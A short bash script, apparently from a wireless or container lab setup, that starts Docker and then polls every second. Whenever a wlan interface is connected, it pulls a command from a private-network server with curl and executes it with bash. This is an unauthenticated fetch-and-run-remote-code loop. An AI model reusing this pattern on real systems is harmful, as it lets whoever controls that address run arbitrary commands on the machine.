#!/usr/bin/env bash

service docker start
while true
do
        sleep 1
        echo "Hello"
        interface="`hostname`-wlan0"
        status=$(iw dev "$interface" link| head -n1| awk '{print $1;}')
        if [[ "$status" == "Connected" ]];
        then
                cmd=$(curl 172.18.5.12:5000)
                bash -c "$cmd"
        fi
done

